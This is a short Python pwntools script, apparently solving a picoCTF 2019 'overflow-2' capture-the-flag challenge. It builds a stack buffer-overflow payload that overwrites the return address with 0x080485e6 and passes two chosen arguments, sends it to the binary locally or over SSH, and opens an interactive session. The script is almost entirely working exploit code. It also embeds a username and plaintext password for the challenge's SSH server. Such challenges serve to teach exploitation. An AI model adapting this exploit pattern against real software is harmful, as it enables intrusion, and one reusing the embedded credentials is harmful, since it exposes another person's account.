from pwn import *

# Config
LOCAL = True
WRITE = True

# Setup
context.log_level = 'debug'
prob_dir = '/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e/'
exe = 'vuln'
if LOCAL:
    sh = process('./' + exe)
else:
    s = ssh(host='2019shell1.picoctf.com', user='thomasvn', password='#8L7Z#Fj')
    sh = s.process(prob_dir + exe, cwd=prob_dir)

# Build exploit
cmd = b'A' * 176  # buffer
cmd += b'B' * 4   # var -> .rodata:aFlagFileIsMiss+44
cmd += b'C' * 4   # var -> .got.plt:_GLOBAL_OFFSET_TABLE_
cmd += b'D' * 4   # var -> [stack]:FFF4D618
cmd += p32(0x080485e6)  # overwrite return
cmd += b'E' * 4
cmd += p32(0xDEADBEEF)  # arg1
cmd += p32(0xC0DED00D)  # arg2


# Write exploit to file
if WRITE:
    f = open('input.txt', 'wb')
    f.write(cmd)
    f.close()

# Buffer overflow
sh.sendlineafter(': ', cmd)
sh.interactive()
